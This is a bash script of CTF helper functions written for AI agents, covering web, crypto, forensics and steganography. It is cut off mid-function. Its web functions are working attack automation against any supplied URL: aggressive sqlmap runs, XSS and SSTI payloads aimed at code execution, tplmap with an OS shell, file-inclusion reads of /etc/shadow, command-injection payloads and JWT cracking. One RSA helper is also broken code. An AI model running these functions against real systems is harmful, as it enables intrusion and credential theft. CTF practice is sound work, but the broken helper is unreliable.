#!/bin/bash
# ============================================================
# CTF PLAYBOOK FOR AI AGENTS
# LOCATION: /opt/playbooks/ctf-playbook.sh
# USAGE:   source /opt/playbooks/ctf-playbook.sh
#
# Covers: Web, Crypto, Pwn, Forensics, Steganography,
#         Reverse Engineering, Misc/Binary
# ============================================================

# Load shared scan helpers
source /opt/playbooks/scan-helpers.sh

export CTF_OUTPUT_DIR="/workspace/ctf_runs"
export CTF_WORKSPACE="/workspace/ctf_workspace"
mkdir -p "$CTF_OUTPUT_DIR" "$CTF_WORKSPACE"

# ============================================================
# TUNABLE CONSTANTS (magic numbers)
# ============================================================
# Web - SQLi union test column range
CTF_SQLI_MAX_COLUMNS=10

# Web - SSTI nuclei rate-limit / concurrency / timeout
CTF_SSTI_NUCLEI_RATE_LIMIT=10
CTF_SSTI_NUCLEI_CONCURRENCY=5
CTF_SSTI_NUCLEI_TIMEOUT=15

# Web - Command injection blind timing threshold (seconds)
CTF_CMDI_TIMING_THRESHOLD=3

# Crypto - XOR single-byte range (0-255)
CTF_XOR_MAX_SINGLE_BYTE=256

# Crypto - XOR repeating-key max length to try
CTF_XOR_MAX_KEY_LENGTH=32

# Crypto - XOR top candidates to display
CTF_XOR_TOP_CANDIDATES=5

# Crypto - XOR printable-ratio threshold (0-1)
CTF_XOR_PRINTABLE_RATIO=0.85

# Forensics / Stego - minimum string length for extraction
CTF_STRINGS_MIN_LEN=4
CTF_STRINGS_INTERESTING_MIN_LEN=6

# Stego - audio raw sample rate hint
CTF_STEGO_AUDIO_SAMPLE_RATE=8000

# Stego - spectrogram hires dimensions
CTF_STEGO_SPECTROGRAM_WIDTH=1500
CTF_STEGO_SPECTROGRAM_HEIGHT=500

# Stego - LSB extraction pixel limit
CTF_STEGO_LSB_MAX_PIXELS=8000

# Misc - default netcat listener port
CTF_NETCAT_DEFAULT_PORT=4444

# Triage - hex dump preview byte count
CTF_TRIAGE_HEX_PREVIEW_BYTES=64


# ============================================================
# WEB CTF CHALLENGES
# Covers: SQLi, XSS, SSTI, LFI/RFI, SSRF, Command Injection,
#         Deserialization, JWT, Prototype Pollution
# ============================================================
ctf_web_sqli() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_sqli <target_url>"
        return 1
    fi
    echo "[CTF-WEB] === SQL INJECTION ==="
    local outdir=$(scan_dir "CTF-Web-SQLi" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/4] Quick sqlmap scan..."
    sqlmap -u "$target" --batch --level=3 --risk=2 --dbs --output-dir="$outdir/sqlmap" 2>/dev/null

    echo "[CTF-WEB] [2/4] SQLi with tamper scripts..."
    sqlmap -u "$target" --batch --level=5 --risk=3 \
        --tamper="space2comment,between,randomcase,charencode" \
        --output-dir="$outdir/sqlmap-tamper" 2>/dev/null

    echo "[CTF-WEB] [3/4] Manual union-based test..."
    curl -s "$target" | head -20 > "$outdir/page-snapshot.txt"
    for i in $(seq 1 $CTF_SQLI_MAX_COLUMNS); do
        local payload="' UNION SELECT $i-- -"
        echo "  Testing column $i..."
        curl -s "$target$(echo $payload | jq -sRr @uri)" > "$outdir/union-col-$i.html" 2>/dev/null
    done

    echo "[CTF-WEB] [4/4] Boolean/time-based blind..."
    sqlmap -u "$target" --batch --level=5 --risk=3 --technique=BT \
        --output-dir="$outdir/sqlmap-blind" 2>/dev/null

    echo "[CTF-WEB] Results: $outdir"
}

ctf_web_xss() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_xss <target_url>"
        return 1
    fi
    echo "[CTF-WEB] === CROSS-SITE SCRIPTING ==="
    local outdir=$(scan_dir "CTF-Web-XSS" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/3] Dalfox XSS scan..."
    dalfox url "$target" -o "$outdir/dalfox.txt" --silence --only-poc r 2>/dev/null

    echo "[CTF-WEB] [2/3] Reflected XSS fuzzing..."
    ffuf -u "$target?q=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
        -mc 200 -o "$outdir/param-fuzz.json" -of json 2>/dev/null

    echo "[CTF-WEB] [3/3] XSS polyglot payloads..."
    for param in q search id name msg input redirect url next callback; do
        for payload in '<script>alert(1)</script>' '"><img/src=x onerror=alert(1)>' \
            "'-alert(1)-'" '{{7*7}}' '${7*7}'; do
            local encoded=$(echo "$payload" | jq -sRr @uri)
            local resp=$(curl -s "$target?${param}=${encoded}" | grep -c "$payload" 2>/dev/null)
            [ "$resp" -gt 0 ] && echo "  REFLECTED: $param=$payload" >> "$outdir/reflected.txt"
        done
    done

    echo "[CTF-WEB] Results: $outdir"
}

# --- SSTI helpers ---

_ssti_check_payload() {
    local target="$1" param="$2" payload="$3" outdir="$4"
    local encoded=$(echo "$payload" | jq -sRr @uri)
    local body=$(curl -s "$target?${param}=${encoded}" 2>/dev/null)
    if echo "$body" | grep -qE '49|mro__|subclasses__|config|__globals__'; then
        echo "  SSTI HIT: $param=$payload" >> "$outdir/ssti-hits.txt"
    fi
}

_ssti_detect_payloads() {
    local target="$1" outdir="$2"
    local payloads=(
        '{{7*7}}'              # Jinja2/Twig
        '${7*7}'               # Freemarker/Velocity
        '<%= 7*7 %>'           # ERB
        '#{7*7}'               # Slim
        '<#if 1==1>true</#if>' # Freemarker
        '{{self.__class__.__mro__[1].__subclasses__()}}'  # Python RCE
        '{{config}}'           # Flask debug
        '{{request.application.__globals__}}'             # Flask RCE
    )

    for param in q name search input template view page; do
        for payload in "${payloads[@]}"; do
            _ssti_check_payload "$target" "$param" "$payload" "$outdir"
        done
    done
}

_ssti_run_tplmap() {
    local target="$1" outdir="$2"
    if command -v tplmap &>/dev/null; then
        tplmap -u "$target" --os-shell -o "$outdir/tplmap" 2>/dev/null || true
    else
        echo "  [INFO] tplmap not installed. Install with: pip install tplmap"
    fi
}

_ssti_run_nuclei() {
    local target="$1" outdir="$2"
    nuclei -u "$target" -severity low,medium,high,critical \
        -rl $CTF_SSTI_NUCLEI_RATE_LIMIT -c $CTF_SSTI_NUCLEI_CONCURRENCY \
        -timeout $CTF_SSTI_NUCLEI_TIMEOUT -o "$outdir/nuclei-ssti.txt" 2>/dev/null
}

ctf_web_ssti() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_ssti <target_url>"
        return 1
    fi
    echo "[CTF-WEB] === SERVER-SIDE TEMPLATE INJECTION ==="
    local outdir=$(scan_dir "CTF-Web-SSTI" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/3] Basic SSTI detection..."
    _ssti_detect_payloads "$target" "$outdir"

    echo "[CTF-WEB] [2/3] tplmap scan..."
    _ssti_run_tplmap "$target" "$outdir"

    echo "[CTF-WEB] [3/3] Nuclei SSTI templates..."
    _ssti_run_nuclei "$target" "$outdir"

    echo "[CTF-WEB] Results: $outdir"
}

ctf_web_lfi_rfi() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_lfi_rfi <target_url_with_param>"
        return 1
    fi
    echo "[CTF-WEB] === LOCAL/REMOTE FILE INCLUSION ==="
    local outdir=$(scan_dir "CTF-Web-LFI" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/4] Basic LFI..."
    local lfi_paths=(
        '/etc/passwd' '/etc/shadow' '/etc/hosts' '/proc/self/environ'
        '/proc/self/cmdline' '/proc/self/fd/0' '/var/log/apache2/access.log'
        '/var/log/nginx/access.log' '/etc/apache2/apache2.conf'
    )
    for path in "${lfi_paths[@]}"; do
        local encoded=$(echo "$path" | jq -sRr @uri)
        local resp=$(curl -s "$target${encoded}" 2>/dev/null)
        if echo "$resp" | grep -qE 'root:|daemon:|LOG'; then
            echo "  LFI: $path" >> "$outdir/lfi-hits.txt"
            echo "$resp" > "$outdir/lfi-$(basename $path).txt"
        fi
    done

    echo "[CTF-WEB] [2/4] Path traversal variants..."
    local traversals=(
        '../../../etc/passwd' '..%2f..%2f..%2fetc%2fpasswd'
        '....//....//etc/passwd' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        '..%252f..%252f..%252fetc%252fpasswd'
    )
    for t in "${traversals[@]}"; do
        local resp=$(curl -s "$target${t}" 2>/dev/null)
        if echo "$resp" | grep -qE 'root:|daemon:'; then
            echo "  TRAVERSAL HIT: $t" >> "$outdir/traversal-hits.txt"
        fi
    done

    echo "[CTF-WEB] [3/4] PHP wrappers..."
    local wrappers=(
        'php://filter/convert.base64-encode/resource=index'
        'php://filter/convert.base64-encode/resource=flag'
        'php://filter/convert.base64-encode/resource=config'
        'php://input' 'data://text/plain,<?php phpinfo();?>'
        'expect://id' 'phar://'
    )
    for w in "${wrappers[@]}"; do
        local encoded=$(echo "$w" | jq -sRr @uri)
        curl -s -o "$outdir/wrapper-$(echo $w | md5sum | cut -c1-8).txt" \
            "$target${encoded}" 2>/dev/null
    done

    echo "[CTF-WEB] [4/4] LFI wordlist fuzzing..."
    ffuf -u "$target/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
        -mc 200 -o "$outdir/lfi-ffuf.json" -of json 2>/dev/null

    echo "[CTF-WEB] Results: $outdir"
}

# --- Command injection helpers ---

_cmdi_check_payload() {
    local target="$1" payload="$2" param="$3" outdir="$4"
    local encoded=$(echo "$payload" | jq -sRr @uri)
    local resp=$(curl -s "$target?${param}=${encoded}" 2>/dev/null)
    if echo "$resp" | grep -qE 'uid=|gid=|root:|www-data'; then
        echo "  CMDi HIT: $param=$payload" >> "$outdir/cmdi-hits.txt"
        echo "$resp" >> "$outdir/cmdi-$param-$(echo $payload | md5sum | cut -c1-8).txt"
    fi
}

_cmdi_fuzz_params() {
    local target="$1" outdir="$2"
    local cmd_payloads=(
        ';id' '|id' '`id`' '$(id)' '\nid'
        ';cat /etc/passwd' '|cat /etc/passwd' '\ncat /etc/passwd'
        '&&id' '||id' '%0aid' '&id' '|| whoami'
        "';id #" '|id#'  # Comment-based bypass
    )
    for payload in "${cmd_payloads[@]}"; do
        for param in q cmd exec command search input ip ping host target; do
            _cmdi_check_payload "$target" "$payload" "$param" "$outdir"
        done
    done
}

_cmdi_run_commix() {
    local target="$1" outdir="$2"
    commix --url="$target" --batch --output-dir="$outdir/commix" 2>/dev/null || true
}

_cmdi_blind_timing() {
    local target="$1" outdir="$2"
    for delay in "sleep 3" "sleep 5" "ping -c 3 127.0.0.1"; do
        local encoded=$(echo ";$delay" | jq -sRr @uri)
        local start=$(date +%s)
        curl -s "$target?cmd=${encoded}" -o /dev/null 2>/dev/null
        local end=$(date +%s)
        local elapsed=$((end - start))
        [ "$elapsed" -ge $CTF_CMDI_TIMING_THRESHOLD ] && echo "  TIME-BASED HIT: ;$delay (${elapsed}s)" >> "$outdir/time-based.txt"
    done
}

ctf_web_command_injection() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_command_injection <target_url>"
        return 1
    fi
    echo "[CTF-WEB] === COMMAND INJECTION ==="
    local outdir=$(scan_dir "CTF-Web-CMDi" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/3] Basic command injection..."
    _cmdi_fuzz_params "$target" "$outdir"

    echo "[CTF-WEB] [2/3] Commix automated scan..."
    _cmdi_run_commix "$target" "$outdir"

    echo "[CTF-WEB] [3/3] Blind time-based..."
    _cmdi_blind_timing "$target" "$outdir"

    echo "[CTF-WEB] Results: $outdir"
}

ctf_web_jwt() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "[CTF-WEB] Usage: ctf_web_jwt <jwt_token_or_url>"
        return 1
    fi
    echo "[CTF-WEB] === JWT ATTACKS ==="
    local outdir=$(scan_dir "CTF-Web-JWT" "$target")
    mkdir -p "$outdir"

    echo "[CTF-WEB] [1/3] JWT analysis with jwt_tool..."
    jwt_tool "$target" -o "$outdir/jwt_tool" 2>/dev/null || true

    echo "[CTF-WEB] [2/3] Common secret brute force..."
    jwt_tool "$target" -C -d /usr/share/wordlists/rockyou.txt -o "$outdir/jwt_crack" 2>/dev/null || true

    echo "[CTF-WEB] [3/3] Algorithm confusion (none/HS256)..."
    jwt_tool "$target" -X a -o "$outdir/jwt_alg_confusion" 2>/dev/null || true

    echo "[CTF-WEB] Results: $outdir"
}


# ============================================================
# CRYPTO CTF CHALLENGES
# Covers: Hash identification, Classical ciphers, RSA, XOR,
#         Encoding detection, Custom scripts
# ============================================================
ctf_crypto_identify() {
    local input="$1"
    if [ -z "$input" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_identify <hash_or_ciphertext>"
        return 1
    fi
    echo "[CTF-CRYPTO] === IDENTIFICATION ==="

    # Save to workspace
    echo "$input" > "$CTF_WORKSPACE/unknown.txt"

    echo "[CTF-CRYPTO] [1/3] Hash identification..."
    echo "$input" | hash-identifier 2>/dev/null || echo "  hash-identifier: check manually"

    echo "[CTF-CRYPTO] [2/3] Length/entropy analysis..."
    local len=${#input}
    echo "  Length: $len"
    echo "  Unique chars: $(echo "$input" | fold -w1 | sort -u | wc -l)"
    echo "  Base64? $(echo "$input" | grep -cE '^[A-Za-z0-9+/]+=*$')"

    echo "[CTF-CRYPTO] [3/3] Encoding detection..."
    if echo "$input" | grep -qE '^[A-Fa-f0-9]+$' && [ $((len % 2)) -eq 0 ]; then
        echo "  Likely HEX"
        echo "$input" | xxd -r -p > "$CTF_WORKSPACE/hex_decoded.bin"
        echo "  Decoded to: $CTF_WORKSPACE/hex_decoded.bin"
    fi
    if echo "$input" | base64 -d 2>/dev/null | file - | grep -q "text\|ASCII"; then
        echo "  Likely BASE64"
        echo "$input" | base64 -d > "$CTF_WORKSPACE/b64_decoded.txt"
        echo "  Decoded to: $CTF_WORKSPACE/b64_decoded.txt"
    fi
    if echo "$input" | grep -qE '^[0-9 ]+$'; then
        echo "  Likely numeric cipher or binary"
    fi

    echo "[CTF-CRYPTO] Results in: $CTF_WORKSPACE/"
}

_rsa_factorint_attack() {
    local n="$1" e="$2" c="$3"
    python3 << PYEOF 2>/dev/null || true
from sympy import factorint
n, e, c = int("$n"), int("$e"), int("$c")
factors = factorint(n, limit=10**6)
if len(factors) > 1:
    p, q = list(factors.keys())
    m = pow(c, pow(e, -1, (p - 1) * (q - 1)), n)
    print(f"  [!] FACTORED: {factors} => {m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()}")
else:
    print("  [-] Small factoring failed, trying other methods...")
PYEOF
}

_rsa_small_primes() {
    local n="$1" e="$2" c="$3"
    python3 << PYEOF 2>/dev/null || true
n, e, c = int("$n"), int("$e"), int("$c")
primes = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97]
for p in primes:
    if n % p == 0:
        q = n // p
        m = pow(c, pow(e, -1, (p-1)*(q-1)), n)
        print(f"  [!] Small factor p={p}, q={q} => {m.to_bytes((m.bit_length()+7)//8, 'big').decode()}")
        return 0
return 1
PYEOF
}

_rsa_fermat() {
    local n="$1" e="$2" c="$3"
    python3 << PYEOF 2>/dev/null || true
from math import isqrt
n, e, c = int("$n"), int("$e"), int("$c")
a = isqrt(n)
for _ in range(1000000):
    b2 = a*a - n
    b = isqrt(b2)
    if b*b == b2:
        m = pow(c, pow(e, -1, (a+b-1)*(a-b-1)), n)
        print(f"  [!] Fermat: p={a+b}, q={a-b} => {m.to_bytes((m.bit_length()+7)//8, 'big').decode()}")
        break
    a += 1
PYEOF
}

_rsa_run_rsactftool() {
    local c="$1"
    command -v RsaCtfTool &>/dev/null || [ -d "/opt/opspectre/tools/RsaCtfTool" ] || return 0
    python3 /opt/opspectre/tools/RsaCtfTool/RsaCtfTool.py \
        --publickey <(echo "-----BEGIN PUBLIC KEY-----") \
        --uncipher "$c" 2>/dev/null || true
}

_rsa_print_tips() {
    python3 << 'PYEOF'
print("  Use z3-solver for custom constraints: pip install z3-solver")
print("  Use sage for advanced math: apt install sagemath")
PYEOF
}

ctf_crypto_rsa() {
    local n="$1"
    local e="${2:-65537}"
    local c="$3"
    if [ -z "$n" ] || [ -z "$c" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_rsa <n> [e] <c>"
        return 1
    fi
    echo "[CTF-CRYPTO] === RSA ATTACKS ==="
    local outdir="$CTF_OUTPUT_DIR/rsa_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$outdir"

    echo "[CTF-CRYPTO] [1/4] Factor small N with factordb..."
    _rsa_factorint_attack "$n" "$e" "$c"

    echo "[CTF-CRYPTO] [2/4] Check for small factors..."
    _rsa_small_primes "$n" "$e" "$c" || _rsa_fermat "$n" "$e" "$c"

    echo "[CTF-CRYPTO] [3/4] RsaCtfTool (if installed)..."
    _rsa_run_rsactftool "$c"

    echo "[CTF-CRYPTO] [4/4] Common RSA attacks with Python..."
    _rsa_print_tips

    echo "[CTF-CRYPTO] Results: $outdir"
}

ctf_crypto_xor() {
    local input="$1"
    local key="${2:-}"
    if [ -z "$input" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_xor <hex_encoded_ciphertext> [key]"
        return 1
    fi
    echo "[CTF-CRYPTO] === XOR ANALYSIS ==="

    python3 << PYEOF
import string

ciphertext = bytes.fromhex("$input")
key_hint = "$key"

def _xor_with_known_key(key_hint):
    """Try XOR with a provided key."""
    if not key_hint:
        return
    key_bytes = key_hint.encode()
    result = bytes([c ^ key_bytes[i % len(key_bytes)] for i, c in enumerate(ciphertext)])
    print(f"  [!] XOR with '{key_hint}': {result}")
    try:
        print(f"  [!] Decoded: {result.decode()}")
    except:
        print(f"  [!] Hex: {result.hex()}")

def _single_byte_bruteforce():
    """Brute-force single-byte XOR keys."""
    print("\n  --- Single-byte XOR brute force ---")
    for k in range($CTF_XOR_MAX_SINGLE_BYTE):
        result = bytes([c ^ k for c in ciphertext])
        try:
            decoded = result.decode('ascii')
            if sum(1 for c in decoded if c in string.printable) / len(decoded) > $CTF_XOR_PRINTABLE_RATIO:
                print(f"  key=0x{k:02x} ({k}): {decoded[:80]}")
        except:
            pass

def _repeating_key_bruteforce():
    """Try repeating-key XOR with various key lengths."""
    print("\n  --- Repeating-key XOR (top candidates) ---")
    best_scores = []
    for key_len in range(1, min($CTF_XOR_MAX_KEY_LENGTH + 1, len(ciphertext) // 2)):
        blocks = [ciphertext[i::key_len] for i in range(key_len)]
        score = 0
        for block in blocks:
            for k in range($CTF_XOR_MAX_SINGLE_BYTE):
                dec = bytes([c ^ k for c in block])
                try:
                    t = dec.decode('ascii')
                    score += sum(1 for c in t if c in string.printable)
                except:
                    pass
        best_scores.append((key_len, score / key_len))

    best_scores.sort(key=lambda x: -x[1])
    for kl, sc in best_scores[:$CTF_XOR_TOP_CANDIDATES]:
        print(f"  key_length={kl}: avg_printable_score={sc:.2f}")

_xor_with_known_key(key_hint)
_single_byte_bruteforce()
_repeating_key_bruteforce()
PYEOF
}

ctf_crypto_caesar() {
    local input="$1"
    if [ -z "$input" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_caesar <ciphertext>"
        return 1
    fi
    echo "[CTF-CRYPTO] === CAESAR CIPHER ==="

    python3 << PYEOF
text = "$input"
import string

for shift in range(26):
    result = []
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    decoded = ''.join(result)
    # Score based on common English words
    common = ['the', 'flag', 'ctf', 'and', 'is', 'key', 'this', 'that']
    if any(w in decoded.lower() for w in common):
        print(f"  shift={shift:2d}: {decoded}  <-- LIKELY")
    else:
        print(f"  shift={shift:2d}: {decoded}")
PYEOF
}

ctf_crypto_vigenere() {
    local input="$1"
    local key="${2:-}"
    if [ -z "$input" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_vigenere <ciphertext> [key]"
        return 1
    fi
    echo "[CTF-CRYPTO] === VIGENÈRE CIPHER ==="

    python3 << PYEOF
text = "$input"
key_hint = "$key"

def vigenere_decrypt(text, key):
    result = []
    ki = 0
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            shift = ord(key[ki % len(key)].lower()) - ord('a')
            result.append(chr((ord(c) - base - shift) % 26 + base))
            ki += 1
        else:
            result.append(c)
    return ''.join(result)

if key_hint:
    print(f"  Decrypting with key '{key_hint}': {vigenere_decrypt(text, key_hint)}")
else:
    print("  No key provided. Try common CTF keys:")
    for k in ['flag', 'key', 'secret', 'ctf', 'hack', 'password', 'crypto']:
        dec = vigenere_decrypt(text, k)
        if any(w in dec.lower() for w in ['flag', 'ctf', 'the', 'key']):
            print(f"  key='{k}': {dec}  <-- POSSIBLE")
        else:
            print(f"  key='{k}': {dec}")
PYEOF
}

ctf_crypto_encoding() {
    local input="$1"
    if [ -z "$input" ]; then
        echo "[CTF-CRYPTO] Usage: ctf_crypto_encoding <encoded_string>"
        return 1
    fi
    echo "[CTF-CRYPTO] === ENCODING DECODER ==="

    python3 << PYEOF
import base64, codecs
from urllib.parse import unquote

text = """$input"""

MORSE = {'.-':'A','_...':'B','_._.':'C','_..':'D','.':'E','.._.':'F',
         '__.':'G','....':'H','..':'I','.___':'J','_._':'K','._..':'L',
         '__':'M','_.':'N','___':'O','.__.':'P','__._':'Q','._.':'R',
         '...':'S','_':'T','.._':'U','..._':'V','.__':'W','_.._':'X',
         '_.__':'Y','__..':'Z','-----':'0','.----':'1','..---':'2',
         '...--':'3','....-':'4','.....':'5','-....':'6','--...':'7',
         '---..':'8','----.':'9','/':' '}

def _try(label, func, condition=None):
    try:
        if condition and not condition():
            return
        result = func()
        if result is None:
            return
        print(f"  {label:<13}{result}")
    except Exception:
        pass

def _decode_morse(t):
    words = t.strip().split(' / ')
    decoded = ' '.join(''.join(MORSE.get(c, '?') for c in w.split(' ')) for w in words)
    return decoded if '?' not in decoded else None

def _try_standard_encodings():
    """Try base64, base32, base85, hex decodings."""
    _try("Base64:",      lambda: base64.b64decode(text).decode('utf-8', errors='replace'))
    _try("Base32:",      lambda: base64.b32decode(text).decode('utf-8', errors='replace'))
    _try("Base85:",      lambda: base64.b85decode(text).decode('utf-8', errors='replace'))
    _try("Hex:",         lambda: bytes.fromhex(text.replace(' ', '')).decode('utf-8', errors='replace'))

def _try_rot_and_url():
    """Try ROT13 and URL encoding."""
    _try("ROT13:",       lambda: codecs.decode(text, 'rot_13'))
    _try("URL-encoded:", lambda: unquote(text) if unquote(text) != text else None)

def _try_numeric_encodings():
    """Try binary, octal, decimal decodings."""
    _try("Binary:",      lambda: ''.join(chr(int(b, 2)) for b in text.split()),
                      lambda: all(c in '01 ' for c in text))
    _try("Octal:",       lambda: ''.join(chr(int(o, 8)) for o in text.split()),
                      lambda: all(c in '01234567 ' for c in text))
    _try("Decimal:",     lambda: ''.join(chr(int(n)) for n in text.replace(',', ' ').split()),
                      lambda: all(c in '0123456789 ,' for c in text))

def _try_special_encodings():
    """Try morse and unicode."""
    _try("Morse:",       lambda: _decode_morse(text))
    _try("Unicode:",     lambda: text.encode().decode('unicode_escape'))

_try_standard_encodings()
_try_rot_and_url()
_try_numeric_encodings()
_try_special_encodings()
PYEOF
}


# ============================================================
# FORENSICS CTF CHALLENGES
# Covers: File analysis, metadata, memory, pcap, carving
# ============================================================
# --- Forensics helpers ---

_forensics_file_info() {
    local file="$1" outdir="$2"
    file "$file" > "$outdir/file-type.txt"
    file -i "$file" >> "$outdir/file-type.txt"
    xxd "$file" | head -20 > "$outdir/hexdump.txt"
}

_forensics_strings() {
    local file="$1" outdir="$2"
    strings -n $CTF_STRINGS_MIN_LEN "$file" | grep -iE 'flag|ctf|key|password|secret|hint' > "$outdir/interesting-strings.txt"
    strings -n $CTF_STRINGS_INTERESTING_MIN_LEN "$file" > "$outdir/all-strings.txt"
}

_forensics_metadata() {
    local file="$1" outdir="$2"
    if command -v exiftool &>/dev/null; then
        exiftool "$file" > "$outdir/metadata.txt" 2>/dev/null || true
    fi
}

_forensics_stego_check() {
    local file="$1" outdir="$2"
    if command -v steghide &>/dev/null; then
        echo "  Trying empty steghide extract..."
        steghide extract -sf "$file" -p "" -xf "$outdir/steghide-empty.txt" 2>/dev/null || true
    fi
    if command -v binwalk &>/dev/null; then
        binwalk "$file" > "$outdir/binwalk.txt" 2>/dev/null
    fi
    # Check for trailing bytes after file end markers
    local ftype=$(file -b "$file")
    local sig_end=""
    case "$ftype" in
        *PNG*) sig_end=$(grep -b -ao 'IEND' "$file" | tail -1 | cut -d: -f1) ;;
        *JPEG*) sig_end=$(grep -b -ao '\xff\xd9' "$file" | tail -1 | cut -d: -f1) ;;
        *GIF*) sig_end=$(grep -b -ao ';\x00' "$file" | tail -1 | cut -d: -f1) ;;
    esac
    if [ -n "$sig_end" ]; then
        local fsize=$(stat -c%s "$file")
        local trailing=$((fsize - sig_end - 4))
        if [ "$trailing" -gt 0 ]; then
            echo "  [!] Trailing data detected: $trailing bytes after EOF marker"
            tail -c "$trailing" "$file" > "$outdir/trailing-data.bin"
            file "$outdir/trailing-data.bin"
        fi
    fi
}

_forensics_carve() {
    local file="$1" outdir="$2"
    if command -v foremost &>/dev/null; then
        foremost -i "$file" -o "$outdir/carved/" -t all 2>/dev/null || true
        echo "  Carved files in: $outdir/carved/"
    fi
}

_forensics_hashes() {
    local file="$1" outdir="$2"
    md5sum "$file" > "$outdir/hashes.txt"
    sha256sum "$file" >> "$outdir/hashes.txt"
}

ctf_forensics_analyze() {
    local file="$1"
    if [ -z "$file" ]; then
        echo "[CTF-FOR] Usage: ctf_forensics_analyze <file>"
        return 1
    fi
    echo "[CTF-FOR] === FILE ANALYSIS ==="
    local outdir=$(scan_dir "CTF-Forensics" "$file")
    mkdir -p "$outdir"

    echo "[CTF-FOR] [1/6] File type identification..."
    _forensics_file_info "$file" "$outdir"

    echo "[CTF-FOR] [2/6] Strings extraction..."
    _forensics_strings "$file" "$outdir"

    echo "[CTF-FOR] [3/6] Metadata extraction..."
    _forensics_metadata "$file" "$outdir"

    echo "[CTF-FOR] [4/6] Hidden data / steganography check..."
    _forensics_stego_check "$file" "$outdir"

    echo "[CTF-FOR] [5/6] File carving..."
    _forensics_carve "$file" "$outdir"

    echo "[CTF-FOR] [6/6] Hash of original..."
    _forensics_hashes "$file" "$outdir"

    echo "[CTF-FOR] Results: $outdir"
}

ctf_forensics_pcap() {
    local pcap="$1"
    if [ -z "$pcap" ]; then
        echo "[CTF-FOR] Usage: ctf_forensics_pcap <pcap_file>"
        return 1
    fi
    echo "[CTF-FOR] === PCAP ANALYSIS ==="
    local outdir=$(scan_dir "CTF-Forensics-PCAP" "$pcap")
    mkdir -p "$outdir"

    echo "[CTF-FOR] [1/6] Protocol summary..."
    tshark -r "$pcap" -q -z io,phs > "$outdir/protocol-hierarchy.txt" 2>/dev/null || true

    echo "[CTF-FOR] [2/6] HTTP requests..."
    tshark -r "$pcap" -Y "http.request" -T fields \
        -e http.request.method -e http.request.uri -e http.host \
        -E header=y -E separator="|" > "$outdir/http-requests.txt" 2>/dev/null || true

    echo "[CTF-FOR] [3/6] DNS queries..."
    tshark -r "$pcap" -Y "dns.qr == 0" -T fields \
        -e dns.qry.name -E header=y > "$outdir/dns-queries.txt" 2>/dev/null || true

    echo "[CTF-FOR] [4/6] Credentials in cleartext..."
    tshark -r "$pcap" -Y "http.authorization or ftp or telnet or smtp" \
        -T fields -e frame.number -e ip.src -e ip.dst \
        -e http.authorization -E header=y > "$outdir/credentials.txt" 2>/dev/null || true

    echo "[CTF-FOR] [5/6] Extract transferred files..."
    tshark -r "$pcap" --export-objects http,"$outdir/extracted-http/" 2>/dev/null || true
    tshark -r "$pcap" --export-objects smb,"$outdir/extracted-smb/" 2>/dev/null || true
    tshark -r "$pcap" --export-objects tftp,"$outdir/extracted-tftp/" 2>/dev/null || true

    echo "[CTF-FOR] [6/6] TCP streams with 'flag' keyword..."
    tshark -r "$pcap" -Y "tcp contains \"flag\" or tcp contains \"CTF\"" \
        -T fields -e tcp.stream -e data.data -E header=y > "$outdir/flag-streams.txt" 2>/dev/null || true

    echo "[CTF-FOR] Results: $outdir"
}


# ============================================================
# STEGANOGRAPHY CTF CHALLENGES
# Covers: Image, audio, file-based hiding
# ============================================================
_stego_img_file_info() {
    local image="$1" outdir="$2"
    file "$image" > "$outdir/file-info.txt"
    identify "$image" > "$outdir/dimensions.txt" 2>/dev/null || true
}

_stego_img_strings() {
    local image="$1" outdir="$2"
    strings -n $CTF_STRINGS_MIN_LEN "$image" | grep -iE 'flag|ctf|key|secret|hint' > "$outdir/strings.txt"
}

_stego_img_exif() {
    local image="$1" outdir="$2"
    command -v exiftool &>/dev/null || return 0
    exiftool "$image" > "$outdir/exif.txt" 2>/dev/null || true
}

_stego_img_steghide() {
    local image="$1" outdir="$2"
    command -v steghide &>/dev/null || return 0
    local pw
    for pw in password secret flag hidden stego '' ' '; do
        steghide extract -sf "$image" -p "$pw" -xf "$outdir/steghide-$pw.txt" 2>/dev/null || true
    done
}

_stego_img_stegseek() {
    local image="$1" outdir="$2"
    command -v stegseek &>/dev/null || return 0
    stegseek "$image" /usr/share/wordlists/rockyou.txt -xf "$outdir/stegseek-cracked.txt" 2>/dev/null || true
}

_stego_img_zsteg() {
    local image="$1" outdir="$2"
    command -v zsteg &>/dev/null || return 0
    zsteg "$image" > "$outdir/zsteg.txt" 2>/dev/null || true
}

_stego_img_binwalk() {
    local image="$1" outdir="$2"
    command -v binwalk &>/dev/null || return 0
    binwalk "$image" > "$outdir/binwalk.txt" 2>/dev/null
    binwalk -e "$image" -C "$outdir/extracted/" 2>/dev/null || true
}

_stego_img_lsb_extract() {
    local image="$1"
    python3 << PYEOF 2>/dev/null || true
from PIL import Image
img = Image.open("$image")
pixels = list(img.getdata())
